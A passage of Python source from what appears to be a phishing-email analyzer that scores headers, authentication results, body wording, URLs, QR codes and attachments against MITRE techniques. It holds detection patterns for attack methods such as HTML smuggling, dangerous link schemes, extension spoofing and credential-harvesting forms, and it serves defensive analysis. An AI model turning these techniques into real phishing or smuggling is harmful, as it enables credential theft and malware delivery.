                         f"From: {self.from_addr} / Reply-To: {ra}" + (" (free-mail)" if rd in FREEMAIL else ""), pts,
                         tag="replyto")
        rp_raw = self.h("Return-Path")
        rp = parseaddr(rp_raw)[1].lower() if rp_raw else ""
        self.return_path = rp
        if rp:
            self.ioc("email", rp, "Return-Path (envelope sender)")
            rpd = rp.rsplit("@", 1)[-1]
            if rpd and from_reg and registered_domain(rpd) != from_reg:
                self.add("Header", "LOW", "Return-Path domain differs from From domain",
                         f"Envelope sender {rp} vs From {self.from_addr} (normal for ESPs, suspicious otherwise)", 1)
                self.ioc("domain", rpd, "Return-Path domain")

        # message-id
        mid = self.h("Message-ID")
        self.message_id = mid
        if not mid:
            self.add("Header", "LOW", "Missing Message-ID", "", 1)
        else:
            mm = re.search(r"@([^>\s]+)", mid)
            if mm and from_reg and registered_domain(mm.group(1).lower().rstrip(">")) != from_reg:
                self.add("Header", "LOW", "Message-ID domain differs from sender domain",
                         f"Message-ID {mid}", 1)
        if mid:
            self.ioc("message-id", mid, "Message-ID")

        # mailer
        mailer = self.h("X-Mailer") or self.h("User-Agent")
        self.mailer = mailer
        if mailer:
            self.ioc("mailer", mailer, "X-Mailer/User-Agent")
            if re.search(r"phpmailer|mass\s*mail|bulk|sendblaster|atomic\s*mail|the\s*bat|massmailer|swiftmailer|jmailer", mailer, re.I):
                self.add("Header", "MEDIUM", "Bulk / script mailer used", f"X-Mailer: {mailer}", 2)
        if m.get("X-Gophish-Contact") or m.get("X-Gophish-Signature") or re.search(r"gophish", mailer or "", re.I):
            self.add("Header", "INFO", "GoPhish headers present - likely an internal phishing SIMULATION",
                     "Verify with your security-awareness team before treating as an attack.", 0)
        if m.get("X-Originating-IP"):
            self.ioc("ip", m.get("X-Originating-IP").strip("[] "), "X-Originating-IP")

        # recipients
        to_all = getaddresses([dh(x) for x in (m.get_all("To", []) + m.get_all("Cc", []))])
        self.recipients = [a.lower() for _n, a in to_all if a]
        if not self.recipients or re.search(r"undisclosed|bcc", self.h("To"), re.I):
            self.add("Header", "LOW", "Recipient hidden (BCC / undisclosed)", "Typical for mass mailing.", 1)

        # subject / date
        date_hdr = self.h("Date")
        self.date_dt = parse_dt(date_hdr) if date_hdr else None
        if not date_hdr:
            self.add("Header", "LOW", "Missing Date header", "", 1)
        if re.match(r"(?i)^\s*(re|fw|fwd)\s*:", self.subject) and not (m.get("In-Reply-To") or m.get("References")):
            self.add("Header", "MEDIUM", "Fake reply/forward subject (RE:/FW:) with no In-Reply-To/References",
                     f"Subject: {self.subject}", 2, tag="replychain")
        if self.subject:
            self.ioc("subject", self.subject, "Subject")

        # spam-filter verdict headers (Microsoft)
        fh = self.h("X-Forefront-Antispam-Report")
        self.spam_hdrs = {}
        if fh:
            cat = re.search(r"CAT:([A-Z,]+)", fh)
            sfv = re.search(r"SFV:([A-Z]+)", fh)
            self.spam_hdrs["Forefront CAT"] = cat.group(1) if cat else ""
            self.spam_hdrs["Forefront SFV"] = sfv.group(1) if sfv else ""
            if cat and re.search(r"PHSH|PHISH|MALW|HPHSH|HPHISH|SPOOF|IMPERSONATION", cat.group(1)):
                self.add("Header", "HIGH", "Mail gateway already flagged as phish/malware/spoof",
                         f"X-Forefront-Antispam-Report CAT:{cat.group(1)}", 3)
        for hname in ("X-MS-Exchange-Organization-SCL", "X-Spam-Status", "X-Spam-Flag", "X-Spam-Score",
                      "X-Microsoft-Antispam", "X-MS-Exchange-Organization-AuthAs"):
            if m.get(hname):
                self.spam_hdrs[hname] = " ".join(str(m.get(hname)).split())[:160]
        scl = self.spam_hdrs.get("X-MS-Exchange-Organization-SCL")
        if scl and scl.strip().lstrip("-").isdigit() and int(scl) >= 5:
            self.add("Header", "MEDIUM", f"High spam confidence level (SCL={scl})", "", 1)

    # ---- received chain -----------------------------------------------------
    def analyze_received(self):
        recvs = [" ".join(str(x).split()) for x in self.msg.get_all("Received", [])]
        hops = []
        for i, r in enumerate(recvs, 1):
            ts = parse_dt(r.rsplit(";", 1)[1].strip()) if ";" in r else None
            frm = re.search(r"\bfrom\s+(\S+)", r, re.I)
            by = re.search(r"\bby\s+(\S+)", r, re.I)
            ips = []
            for ip in IPV4_RE.findall(r):
                try:
                    ipaddress.ip_address(ip)
                    ips.append(ip)
                except ValueError:
                    pass
            for ip6 in re.findall(r"\[([0-9a-fA-F:]{3,})\]", r):
                try:
                    ipaddress.ip_address(ip6)
                    ips.append(ip6)
                except ValueError:
                    pass
            pub = [ip for ip in dict.fromkeys(ips) if is_public_ip(ip)]
            hops.append({"n": i, "from": frm.group(1) if frm else "", "by": by.group(1) if by else "",
                         "ips": list(dict.fromkeys(ips)), "public": pub, "ts": ts, "raw": r})
        self.hops = hops
        self.origin = None
        for hp in reversed(hops):  # bottom-most hop first = closest to sender
            if hp["public"]:
                self.origin = hp
                break
        if self.origin is None and hops:
            self.origin = hops[-1]
        self.origin_ip = (self.origin["public"][0] if self.origin and self.origin["public"] else "")
        if self.origin_ip:
            self.ioc("ip", self.origin_ip, "Origin IP (bottom-most public Received hop)")
        for hp in hops:
            for ip in hp["public"]:
                self.ioc("ip", ip, f"Public IP in Received hop #{hp['n']}")

        if not hops:
            self.add("Header", "LOW", "No Received headers", "Headers may be stripped/forged or file is not the original.", 1)
            return

        # HELO vs rDNS
        for hp in hops:
            if not hp["public"]:
                continue
            mm = re.search(r"from\s+(\S+)\s+\(([^)]*)\)", hp["raw"], re.I)
            if mm:
                helo, inner = mm.group(1).lower().strip("[]"), mm.group(2).strip()
                rdns = inner.split()[0].lower() if inner and not inner.startswith("[") else ""
                if rdns in ("unknown", "localhost") or (
                        rdns and "." in rdns and "." in helo and not re.fullmatch(r"[\d.]+", helo) and
                        registered_domain(rdns) != registered_domain(helo)):
                    self.add("Header", "MEDIUM", "HELO name does not match reverse DNS of connecting IP",
                             f"Hop #{hp['n']}: HELO={helo}, rDNS={rdns or 'none'}, IP={hp['public'][0]}", 2)
                    break

        # time sequence
        stamped = [h for h in hops if h["ts"]]
        for a, b in zip(stamped, stamped[1:]):  # a is newer (higher in list), b older
            delta = (a["ts"] - b["ts"]).total_seconds()
            if delta < -300:
                self.add("Header", "MEDIUM", "Received timestamps out of order (possible forged header)",
                         f"Hop #{a['n']} is {abs(int(delta))}s earlier than older hop #{b['n']}", 2)
                break
        if len(stamped) >= 2:
            total = (stamped[0]["ts"] - stamped[-1]["ts"]).total_seconds()
            if total > 6 * 3600:
                self.add("Header", "LOW", f"Long delivery delay ({int(total // 3600)}h)", "", 1)
        if self.date_dt and stamped:
            oldest = stamped[-1]["ts"]
            diff = (oldest - self.date_dt).total_seconds()
            if diff > 3 * 86400 or diff < -3600:
                self.add("Header", "MEDIUM", "Date header inconsistent with first Received timestamp",
                         f"Date: {fmt_dt(self.date_dt)} vs first hop {fmt_dt(oldest)}", 2)

    # ---- authentication -----------------------------------------------------
    def analyze_auth(self):
        m = self.msg
        ars = [" ".join(str(x).split()) for x in
               m.get_all("Authentication-Results", []) + m.get_all("X-MS-Exchange-Authentication-Results", [])]
        auth = {k: None for k in ("spf", "dkim", "dmarc", "arc", "compauth")}
        info = {"spf_domain": "", "dkim": [], "dmarc_policy": "", "dmarc_from": "", "raw": ars,
                "dkim_sigs": [], "spf_header": ""}
        for s in ars:
            for k in auth:
                mm = re.search(r"\b%s=([a-z]+)" % k, s, re.I)
                if mm and auth[k] is None:
                    auth[k] = mm.group(1).lower()
            for mm in re.finditer(r"\bdkim=([a-z]+)[^;]*?header\.[di]=@?([A-Za-z0-9.\-]+)", s, re.I):
                info["dkim"].append((mm.group(2).lower(), mm.group(1).lower()))
            mm = re.search(r"smtp\.mailfrom=([^\s;]+)", s, re.I)
            if mm and not info["spf_domain"]:
                info["spf_domain"] = mm.group(1).lower().rsplit("@", 1)[-1].strip("<>")
            mm = re.search(r"dmarc=\w+\s*\(([^)]*)\)", s, re.I)
            if mm:
                pm = re.search(r"\bp=(\w+)", mm.group(1), re.I)
                if pm and not info["dmarc_policy"]:
                    info["dmarc_policy"] = pm.group(1).lower()
            mm = re.search(r"header\.from=([^\s;]+)", s, re.I)
            if mm and not info["dmarc_from"]:
                info["dmarc_from"] = mm.group(1).lower()
        rs = self.h("Received-SPF")
        if rs:
            info["spf_header"] = " ".join(rs.split())[:200]
            mm = re.match(r"\s*(pass|fail|softfail|neutral|none|permerror|temperror)", rs, re.I)
            if mm and auth["spf"] is None:
                auth["spf"] = mm.group(1).lower()
            mm = re.search(r"(?:envelope-from|smtp\.mailfrom)=\"?<?([^\s;>\"]+)", rs, re.I)
            if mm and not info["spf_domain"]:
                info["spf_domain"] = mm.group(1).lower().rsplit("@", 1)[-1]
        if not info["spf_domain"] and getattr(self, "return_path", ""):
            info["spf_domain"] = self.return_path.rsplit("@", 1)[-1]
        for sig in m.get_all("DKIM-Signature", []):
            s = " ".join(str(sig).split())
            d = re.search(r"(?:^|;)\s*d=([^;\s]+)", s)
            sel = re.search(r"(?:^|;)\s*s=([^;\s]+)", s)
            alg = re.search(r"(?:^|;)\s*a=([^;\s]+)", s)
            if d:
                info["dkim_sigs"].append({"d": d.group(1).lower(), "s": sel.group(1) if sel else "",
                                          "a": alg.group(1) if alg else ""})
        self.auth, self.authinfo = auth, info

        from_reg = registered_domain(self.from_domain)
        spf_al = bool(info["spf_domain"]) and registered_domain(info["spf_domain"]) == from_reg
        dkim_domains = [d for d, _r in info["dkim"]] + [x["d"] for x in info["dkim_sigs"]]
        dkim_al = any(registered_domain(d) == from_reg for d in dkim_domains)
        info["spf_aligned"], info["dkim_aligned"] = spf_al, dkim_al

        have_auth = any(v for v in auth.values())
        if not have_auth:
            self.add("Authentication", "INFO", "No Authentication-Results / Received-SPF headers found",
                     "File may be from a client export or pre-gateway; re-pull from the gateway/mailbox with full headers "
                     "or run with --online to check DNS manually.", 0)
        else:
            if auth["dmarc"] == "fail":
                self.add("Authentication", "HIGH", "DMARC FAIL", f"policy p={info['dmarc_policy'] or 'unknown'}", 3, tag="spoof")
            if auth["spf"] in ("fail", "permerror"):
                self.add("Authentication", "HIGH", f"SPF {auth['spf'].upper()}", f"envelope domain: {info['spf_domain']}", 3, tag="spoof")
            elif auth["spf"] == "softfail":
                self.add("Authentication", "MEDIUM", "SPF SOFTFAIL", f"envelope domain: {info['spf_domain']}", 1)
            elif auth["spf"] in ("none", "neutral", "temperror"):
                self.add("Authentication", "LOW", f"SPF {auth['spf']}", "", 1)
            if auth["dkim"] in ("fail", "permerror"):
                self.add("Authentication", "MEDIUM", "DKIM FAIL", "Signature invalid (tampered, or modified by forwarder/list).", 2)
            if auth["compauth"] == "fail":
                self.add("Authentication", "HIGH", "Microsoft composite authentication (compauth) FAIL", "", 2, tag="spoof")
            if auth["dmarc"] != "pass" and (auth["spf"] == "pass" or auth["dkim"] == "pass") and not (spf_al or dkim_al):
                self.add("Authentication", "HIGH", "SPF/DKIM pass but NOT aligned with visible From domain",
                         f"SPF domain={info['spf_domain'] or 'n/a'}, DKIM d={','.join(sorted(set(dkim_domains))) or 'n/a'}, "
                         f"From={self.from_domain} -> attacker-controlled infrastructure signing for itself.", 2, tag="spoof")
        weak = [x for x in info["dkim_sigs"] if "sha1" in x["a"].lower()]
        if weak:
            self.add("Authentication", "LOW", "DKIM signature uses weak rsa-sha1", "", 0)
        if info["dkim_sigs"] and not dkim_al and auth["dmarc"] == "pass":
            pass
        if self.from_domain and auth["dmarc"] == "pass" and spf_al is False and dkim_al is False:
            self.add("Authentication", "INFO", "DMARC pass reported but alignment not visible in headers", "Check gateway logic.", 0)

    # ---- body ---------------------------------------------------------------
    def analyze_body(self):
        plain = "\n".join(self.text_parts)
        html_raw = "\n".join(self.html_parts)
        hp = BodyParser()
        if html_raw:
            try:
                hp.feed(html_raw)
                hp.close()
            except Exception:
                pass
        visible = " ".join(" ".join(hp.text).split())
        text = (plain + "\n" + visible + "\n" + self.subject).strip()
        self.body_plain, self.body_html, self.hp, self.body_text = plain, html_raw, hp, text

        urg = kw_hits(text, URGENCY)
        cred = kw_hits(text, CREDENTIAL)
        fin = kw_hits(text, FINANCIAL)
        sec = kw_hits(text, SECRECY)
        ext = kw_hits(text, EXTORTION)
        auth_w = kw_hits(text, AUTHORITY)
        cb = kw_hits(text, CALLBACK)
        greet = GENERIC_GREETING.search(text)
        self.body_info = {"urgency": urg, "credential": cred, "financial": fin, "secrecy": sec,
                          "extortion": ext, "authority": auth_w, "callback": cb,
                          "generic_greeting": greet.group(0) if greet else "", "text_len": len(visible or plain)}

        if len(urg) >= 4:
            self.add("Body", "MEDIUM", "Heavy urgency / threat language", ", ".join(urg[:8]), 2)
        elif len(urg) >= 2:
            self.add("Body", "LOW", "Urgency / threat language", ", ".join(urg), 1)
        if cred:
            self.add("Body", "MEDIUM" if len(cred) >= 2 else "LOW", "Credential / account-verification language",
                     ", ".join(cred[:8]), 1 + (len(cred) >= 3), ("T1598.003",), "cred")
        if fin:
            self.add("Body", "MEDIUM", "Financial / payment language", ", ".join(fin[:8]), 1, tag="fin")
        if sec:
            self.add("Body", "HIGH", "Secrecy / pressure phrases typical of BEC", ", ".join(sec), 2, ("T1656",), "bec")
        if ext:
            self.add("Body", "HIGH", "Extortion / sextortion language", ", ".join(ext), 4, tag="extortion")
        if greet:
            self.add("Body", "LOW", "Generic greeting", greet.group(0), 1)
        btc = BTC_RE.findall(text)
        if btc:
            for b in btc[:3]:
                self.ioc("crypto-address", b, "Wallet address in body")
            self.add("Body", "HIGH", "Crypto wallet address in body", ", ".join(btc[:3]), 2, tag="extortion")
        if re.search(r"\bscan\b[^.]{0,60}\bqr\b|\bqr\s*code\b", text, re.I):
            self.add("Body", "MEDIUM", "Mentions scanning a QR code (quishing pattern)", "", 2, tag="qr")

        # callback / TOAD
        phones = []
        if len(cb) >= 2:
            phones = [p.strip() for p in PHONE_RE.findall(text) if len(re.sub(r"\D", "", p)) >= 10]
        if phones:
            for p in dict.fromkeys(phones):
                self.ioc("phone", p, "Phone number (callback phishing)")
            self.add("Body", "HIGH", "Callback-phishing (TOAD) pattern: phone number + billing/subscription language",
                     f"{', '.join(list(dict.fromkeys(phones))[:3])}; keywords: {', '.join(cb[:5])}", 3, ("T1566",), "toad")

        # HTML features
        if html_raw:
            if hp.hidden:
                self.add("Body", "LOW", "Hidden text/elements in HTML (display:none, font-size:0, ...)",
                         f"{len(hp.hidden)} element(s) - used for filter evasion or preheader text", 1)
            if hp.forms:
                self.add("Body", "HIGH", "HTML <form> embedded in e-mail body",
                         f"actions: {[f['action'] for f in hp.forms][:3]}; password field: {'password' in hp.inputs}",
                         4, ("T1056.003",), "cred")
            if hp.scripts:
                self.add("Body", "HIGH", "<script> inside e-mail body", f"{hp.scripts} script tag(s)", 3)
            if hp.iframes:
                self.add("Body", "MEDIUM", "<iframe> inside e-mail body", ", ".join(hp.iframes[:3]), 2)
            if hp.metas:
                self.add("Body", "MEDIUM", "Meta refresh redirect in e-mail body", ", ".join(hp.metas[:2]), 2)
            if hp.base:
                self.add("Body", "MEDIUM", "<base href> overrides relative links", hp.base, 2)
            pixels = [i for i in hp.images if (i["w"] in ("0", "1") or i["h"] in ("0", "1") or
                                                re.search(r"width:[01]px|height:[01]px", i["style"]) or
                                                re.search(r"track|pixel|beacon|/open\b|/o/", i["src"], re.I))
                      and i["src"].lower().startswith("http")]
            if pixels:
                self.add("Body", "LOW", "Tracking pixel / web beacon", ", ".join(defang(p["src"]) for p in pixels[:3]), 1)
                for p in pixels[:3]:
                    self.ioc("url", p["src"], "Tracking pixel")
            ext_imgs = [i for i in hp.images if i["src"].lower().startswith("http")]
            for i in ext_imgs[:10]:
                h = urllib.parse.urlsplit(i["src"]).hostname or ""
                self.ioc("domain", h, "Remote image host") if h and h != self.from_domain else None
            if len(visible) < 60 and (hp.images or self.inline_imgs):
                self.add("Body", "MEDIUM", "Image-only / near-empty text e-mail (filter evasion)",
                         f"{len(visible)} visible chars, {len(hp.images)} image(s)", 2)
            self.html_features = {"links": len(hp.links), "forms": len(hp.forms), "images": len(hp.images),
                                  "scripts": hp.scripts, "iframes": len(hp.iframes), "hidden": len(hp.hidden),
                                  "tracking_pixels": len(pixels), "meta_refresh": len(hp.metas)}
            hits = self.scan_html_patterns(html_raw)
            for d, pts, mt in hits:
                if pts >= 4:
                    self.add("Body", "HIGH", f"E-mail HTML contains: {d}", "", pts, (mt,))
        if ZERO_WIDTH_RE.search(html_raw + plain + self.subject):
            n = len(ZERO_WIDTH_RE.findall(html_raw + plain + self.subject))
            self.add("Body", "MEDIUM", "Zero-width / invisible characters present",
                     f"{n} chars - keyword-filter evasion", 2)

        # link text vs href mismatch
        mism = 0
        for ln in hp.links:
            href, txt = ln["href"], ln["text"].strip()
            if not re.match(r"(?i)https?://", href):
                continue
            tm = URL_RE.search(txt) or WWW_RE.search(txt) or re.fullmatch(r"(?i)[a-z0-9.-]+\.[a-z]{2,}(/\S*)?", txt)
            if not tm:
                continue
            tt = tm.group(0) if hasattr(tm, "group") else txt
            if not re.match(r"(?i)https?://", tt):
                tt = "http://" + tt
            th = urllib.parse.urlsplit(tt).hostname or ""
            hh = urllib.parse.urlsplit(href).hostname or ""
            inner, _w = unwrap_url(href)
            if inner:
                hh = urllib.parse.urlsplit(inner).hostname or hh
            if th and hh and registered_domain(th) != registered_domain(hh):
                mism += 1
                self.add("Body", "HIGH", "Link text shows one domain but href goes to another",
                         f"text: {defang(tt)}  ->  href: {defang(href)}", 3, ("T1566.002",), "cred")
                if mism >= 2:
                    break

        # QR
        self.decode_qr_images()

        # classify
        if (cred or hp.forms) and not fin:
            self.tags.add("cred")

    def scan_html_patterns(self, text):
        hits = []
        for rx, d, pts, mt in HTML_RE:
            if rx.search(text):
                hits.append((d, pts, mt))
        if re.search(r"new\s+Blob", text, re.I) and re.search(r"createObjectURL|msSaveOrOpenBlob", text, re.I) \
                and re.search(r"atob|Uint8Array", text, re.I):
            hits.append(("HTML SMUGGLING pattern (Blob + atob/Uint8Array + download trigger)", 6, "T1027.006"))
        return hits

    def decode_qr(self, data: bytes):
        try:
            from PIL import Image  # type: ignore
            from pyzbar.pyzbar import decode  # type: ignore
            return [d.data.decode("utf-8", "ignore") for d in decode(Image.open(io.BytesIO(data)))]
        except Exception:
            pass
        try:
            import cv2  # type: ignore
            import numpy as np  # type: ignore
            img = cv2.imdecode(np.frombuffer(data, np.uint8), cv2.IMREAD_COLOR)
            val, _p, _s = cv2.QRCodeDetector().detectAndDecode(img)
            return [val] if val else []
        except Exception:
            return None

    def decode_qr_images(self):
        imgs = [(f"inline:{cid or 'img'}", d) for cid, d in self.inline_imgs] + \
               [(n, d) for n, c, d in self.raw_atts if c.startswith("image/")]
        if not imgs:
            return
        for name, data in imgs[:10]:
            res = self.decode_qr(data)
            if res is None:
                if self.qr_supported is None:
                    self.qr_supported = False
                    self.add("Body", "INFO", "Images present but no QR decoder installed",
                             "pip install pyzbar pillow  (or opencv-python) - or run: zbarimg <image>", 0)
                break
            self.qr_supported = True
            for val in res:
                self.qr_results.append((name, val))
                self.add("Body", "HIGH", "QR code decoded from image (quishing)", f"{name}: {defang(val)}", 3, ("T1566.002",), "qr")

    # ---- urls ---------------------------------------------------------------
    def analyze_urls(self):
        cands = []
        for ln in self.hp.links:
            href = ln["href"]
            if re.match(r"(?i)(javascript|data|vbscript):", href):
                self.add("URL", "HIGH", "Dangerous URI scheme in link", defang(href[:100]), 4)
            elif re.match(r"(?i)(https?|ftp)://", href):
                cands.append((href, "HTML href"))
        text_all = self.body_plain + "\n" + " ".join(self.hp.text)
        for u in URL_RE.findall(text_all) + ["http://" + w for w in WWW_RE.findall(text_all)]:
            cands.append((u.rstrip(".,;:!?)>]'\""), "body text"))
        for name, val in self.qr_results:
            if re.match(r"(?i)https?://", val):
                cands.append((val, f"QR code ({name})"))
        for u, src in cands:
            self.analyze_url(u, src)

    def analyze_url(self, url, source, depth=0):
        url = url.strip().strip("<>\"'")
        if not url or noise_url(url):
            return
        if url in self._url_seen:
            rec = self._url_seen[url]
            if source not in rec["source"]:
                rec["source"] += f", {source}"
            return
        flags = []

        def fl(text, pts):
            flags.append((text, pts))

        try:
            u = urllib.parse.urlsplit(url)
            host = (u.hostname or "").lower()
            port = u.port
        except ValueError:
            u, host, port = None, "", None
            fl("Malformed URL", 2)
        reg = registered_domain(host)
        rec = {"url": url, "defanged": defang(url), "source": source, "host": host, "reg": reg,
               "pts": 0, "flags": [], "wrapper": "", "final": ""}
        self._url_seen[url] = rec
        if not host:
            rec["flags"] = [f[0] for f in flags]
            self.urls.append(rec)
            return

        if u.scheme == "http":
            fl("Plain HTTP (no TLS)", 1)
        if re.fullmatch(r"[\d.]+", host) or ":" in host:
            fl("IP address instead of domain", 3)
        if "@" in (u.netloc or ""):
            fl("Credentials/@ trick in URL (real host differs from visible part)", 3)
        if host.startswith("xn--") or ".xn--" in host:
            try:
                dec = host.encode("ascii").decode("idna")
            except Exception:
                dec = host
            fl(f"Punycode/IDN host ({dec}) - possible homoglyph attack", 3)
        if any(ord(c) > 127 for c in host):
            fl("Non-ASCII characters in host (homoglyph)", 3)
        if host in SHORTENERS or reg in SHORTENERS:
            fl("URL shortener (hides destination)", 2)
        tld = tld_of(host)
        if tld in SUSPICIOUS_TLDS:
            fl(f"Suspicious/cheap TLD .{tld}", 1)
        if any(host == p or host.endswith("." + p) for p in ABUSED_PLATFORMS):
            fl("Abused legitimate hosting/file-sharing platform", 1)
        if port and port not in (80, 443):
            fl(f"Non-standard port {port}", 1)
        la = lookalike(reg)
        if la:
            fl(f"Lookalike domain - {la}", 4)
        # brand in subdomain but wrong registered domain
        sub = host[:-len(reg)].rstrip(".") if host.endswith(reg) and host != reg else ""
        for brand, (tokens, legit) in BRANDS.items():
            if host_in(host, legit):
                break
            toks = [t for t in tokens if len(t) >= 4]
            if sub and any(t in sub for t in toks):
                fl(f"Brand '{brand}' in SUBDOMAIN but registered domain is {reg}", 4)
                break
            if any(t in (u.path or "").lower() for t in toks) and any(host == p or host.endswith("." + p) for p in ABUSED_PLATFORMS):
                fl(f"Brand '{brand}' in path on a file-sharing platform", 1)
                break
        if sub.count(".") >= 3:
            fl("Excessive subdomain depth", 1)
        if len(url) > 180:
            fl(f"Very long URL ({len(url)} chars)", 1)
        if re.search(r"(?i)(login|signin|sign-in|verify|secure|update|account|password|webmail|auth|confirm|billing|wallet|recover|unlock)", (u.path or "") + "?" + (u.query or "")):
            fl("Credential-themed keywords in path/query", 1)
        em = EMAIL_RE.search(urllib.parse.unquote((u.query or "") + "#" + (u.fragment or "")))
        if em:
            fl(f"Victim e-mail embedded in URL ({em.group(0)}) -> targeted kit", 2)
        if re.search(r"(?i)\.(exe|scr|iso|img|js|hta|msi|vbs|bat|lnk|dll|jar|ps1|zip|rar|7z)(?:$|\?)", u.path or ""):
            fl("Direct download of executable/archive", 3)
        if u.path.count("/") <= 1 and re.search(r"[A-Za-z0-9_-]{20,}", u.path or ""):
            fl("Random-looking path token (per-victim tracking/kit)", 1)

        inner, wrapper = unwrap_url(url)
        if inner:
            rec["wrapper"], rec["final"] = wrapper, inner
            fl(f"Wrapped by {wrapper} -> final: {defang(inner)}", 1 if "Safe Links" in wrapper or "Proofpoint" in wrapper else 2)

        rec["pts"] = min(sum(p for _t, p in flags), 10)
        rec["flags"] = [t for t, _p in flags]
        self.urls.append(rec)
        self.ioc("url", url, f"URL ({source})")
        if host:
            self.ioc("domain" if not re.fullmatch(r"[\d.]+", host) else "ip", host, "URL host")
        if rec["pts"] >= 3:
            sev = "HIGH" if rec["pts"] >= 7 else "MEDIUM" if rec["pts"] >= 4 else "LOW"
            self.add("URL", sev, f"Suspicious URL: {defang(url[:110])}", "; ".join(rec["flags"]), min(rec["pts"], 8),
                     ("T1566.002", "T1204.001"), "link")
            if la or any("SUBDOMAIN" in t for t in rec["flags"]):
                self.mitre.add("T1583.001")
        if inner and depth < 2:
            self.analyze_url(inner, f"unwrapped from {wrapper}", depth + 1)

    # ---- attachments --------------------------------------------------------
    def analyze_attachments(self):
        for name, ctype, data in self.raw_atts:
            self.analyze_attachment(name, ctype, data)
        if self.attachments:
            self.mitre.add("T1566.001")
        if self.args.save_attachments and self.attachments:
            d = os.path.join(self.args.out, "attachments")
            os.makedirs(d, exist_ok=True)
            for (name, _c, data) in self.raw_atts:
                with open(os.path.join(d, hashlib.sha256(data).hexdigest() + ".bin"), "wb") as f:
                    f.write(data)

    def sniff(self, data: bytes):
        d = data
        head = d[:4096].lower()
        if d.startswith(b"MZ"):
            return "PE executable (EXE/DLL)", {"exe", "dll", "scr", "com", "cpl", "sys", "ocx", "xll"}
        if d.startswith(b"PK\x03\x04") or d.startswith(b"PK\x05\x06"):
            return "ZIP / OOXML container", {"zip", "docx", "docm", "xlsx", "xlsm", "pptx", "pptm", "jar", "apk",
                                              "odt", "ods", "xlsb", "dotm", "dotx", "xltm", "xltx", "xlam",
                                              "vsdx", "epub", "appx", "msix", "nupkg", "xps", "ppsx"}
        if d.startswith(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"):
            return "OLE2 compound file (legacy Office / MSI / MSG)", {"doc", "xls", "ppt", "msg", "dot", "xlt", "msi", "pub", "vsd", "xla", "ppa", "pps", "wps"}
        if d.startswith(b"%PDF"):
            return "PDF document", {"pdf"}
        if d.startswith(b"{\\rtf"):
            return "RTF document", {"rtf", "doc"}
        if d.startswith(b"Rar!"):
            return "RAR archive", {"rar"}
        if d.startswith(b"7z\xbc\xaf\x27\x1c"):
            return "7-Zip archive", {"7z"}
        if d.startswith(b"\x1f\x8b"):
            return "GZIP archive", {"gz", "tgz", "gzip"}
        if d.startswith(b"MSCF"):
            return "Cabinet archive", {"cab"}
        if len(d) > 32774 and d[32769:32774] == b"CD001":
            return "ISO 9660 disk image", {"iso", "img"}
        if d.startswith(b"L\x00\x00\x00\x01\x14\x02\x00"):
            return "Windows shortcut (LNK)", {"lnk"}
        if d.startswith(b"\xe4\x52\x5c\x7b\x8c\xd8\xa7\x4d\xae\xb1\x53\x78\xd0\x29\x96\xd3"):
            return "OneNote document", {"one"}
        if d.startswith(b"\x7fELF"):
            return "ELF executable", {"elf", "bin", "so", ""}
        if d.startswith(b"\x89PNG"):
            return "PNG image", {"png"}
        if d.startswith(b"\xff\xd8\xff"):
            return "JPEG image", {"jpg", "jpeg", "jpe"}
        if d.startswith((b"GIF87a", b"GIF89a")):
            return "GIF image", {"gif"}
        if d.startswith(b"conectix"):
            return "VHD disk image", {"vhd"}
        if b"<svg" in head:
            return "SVG image (XML)", {"svg"}
        if b"<html" in head or b"<!doctype html" in head or b"<script" in head or b"<body" in head or b"<form" in head:
            return "HTML document", {"htm", "html", "xhtml", "shtml", "mht", "mhtml"}
        try:
            d[:2000].decode("utf-8")
            return "Text / script", None
        except UnicodeDecodeError:
            return "Unknown binary", None

    def analyze_attachment(self, name, ctype, data, depth=0, parent=""):
        disp = (parent + "!" if parent else "") + name
        rec = {"name": disp, "ctype": ctype, "size": len(data), "md5": hashlib.md5(data).hexdigest(),
               "sha1": hashlib.sha1(data).hexdigest(), "sha256": hashlib.sha256(data).hexdigest(),
               "entropy": round(entropy(data), 2), "flags": [], "urls": [], "ips": [], "commands": [],
               "blobs": [], "children": [], "magic": "", "notes": []}
        self.attachments.append(rec)
        lname = name.lower().rstrip()
        ext = os.path.splitext(lname)[1].lstrip(".")

        def flag(sev, text, pts, mitre=(), tag=None):
            rec["flags"].append((sev, text, pts))
            self.add("Attachment", sev, f"{disp}: {text}", "", pts, mitre, tag)

        # --- name based
        if "\u202e" in name:
            flag("HIGH", "Right-to-left override (RTLO) character in filename - extension spoofing", 4, ("T1036.002",), "malware")
        if re.search(r"\.(%s)\.(%s)$" % ("|".join(DOC_EXT), "|".join(EXEC_EXT)), lname):
            flag("HIGH", "Double extension masquerading as a document", 5, ("T1036.007",), "malware")
        if name != name.rstrip() or re.search(r"\s{5,}\.", name):
            flag("MEDIUM", "Trailing/padded spaces in filename (hides real extension)", 2, ("T1036",))
        if ext in DANGEROUS_EXT:
            pts = DANGEROUS_EXT[ext]
            kind = ("Executable/script" if pts >= 5 else "Disk image (bypasses Mark-of-the-Web)" if ext in ("iso", "img", "vhd", "vhdx")
                    else "Macro-enabled Office" if ext.endswith("m") or ext in ("xlam", "ppam") else
                    "HTML/SVG (smuggling/credential-harvest risk)" if ext in ("html", "htm", "shtml", "xhtml", "svg", "mht", "mhtml")
                    else "OneNote (embedded script risk)" if ext in ("one", "onepkg") else "Archive container")
            flag("HIGH" if pts >= 5 else "MEDIUM" if pts >= 3 else "LOW", f"Risky file type .{ext}: {kind}", pts,
                 ("T1553.005",) if ext in ("iso", "img", "vhd", "vhdx") else (), "malware" if pts >= 4 else None)

        # --- true type
        magic, expected = self.sniff(data)
        rec["magic"] = magic
        if expected is not None and ext and ext not in expected and not (magic == "ZIP / OOXML container" and ext in ("zip",)):
            flag("HIGH", f"File extension .{ext} does not match true type: {magic}", 4, ("T1036",), "malware")
        if magic.startswith("PE"):
            flag("HIGH", "Windows PE executable inside an e-mail", 5, ("T1204.002",), "malware")
            self.pe_info(rec, data)
        if rec["entropy"] > 7.4 and len(data) > 4096 and not magic.startswith(("ZIP", "PDF", "JPEG", "PNG", "GIF", "RAR", "7-Zip", "GZIP", "Cabinet", "OLE2")):
            flag("MEDIUM", f"Very high entropy ({rec['entropy']}) - packed/encrypted payload", 2, ("T1027",))

        text_for_scan = ""
        if magic == "ZIP / OOXML container":
            text_for_scan = self.analyze_zip(rec, data, depth, flag, name)
        elif magic.startswith("OLE2"):
            text_for_scan = self.analyze_ole(rec, data, flag)
        elif magic == "PDF document":
            text_for_scan = self.analyze_pdf(rec, data, flag)
        elif magic == "RTF document":
